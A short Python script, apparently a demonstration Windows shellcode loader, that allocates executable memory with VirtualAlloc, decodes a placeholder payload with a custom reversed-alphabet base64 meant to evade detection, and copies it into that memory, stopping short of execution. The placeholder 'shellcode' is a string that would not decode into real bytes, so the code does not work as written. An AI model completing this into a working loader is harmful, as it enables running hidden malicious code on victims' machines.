
import ctypes
import sys
from ctypes import wintypes
import struct


PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = wintypes.LPVOID
VirtualAlloc.argtypes = (
    wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD)


shellcode = b"bytes([0x4e, 0x78, 0x59, 0x5a, 0x67, 0x64, 0x56, 0x63, 0x37, 0x31, 0x37, 0x5a])"



def custom_b64decode(data):
    
    if isinstance(data, bytes):
        data = data.decode()
        
    
    custom_alphabet = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/'
    standard = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    
    
    trans_table = str.maketrans(custom_alphabet, standard)
    standard_b64 = data.translate(trans_table)
    
    
    import base64
    return base64.b64decode(standard_b64)

decoded_shellcode = custom_b64decode(shellcode)


print("[*] Allocating memory...")

buffer = VirtualAlloc(
    None,
    len(decoded_shellcode),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
)

print("[*] Copying shellcode to memory...")

ctypes.memmove(buffer, decoded_shellcode, len(decoded_shellcode))

print("[*] This is where execution would happen in a real tool")
print("[*] No actual execution is implemented")
print("[*] Demo complete")
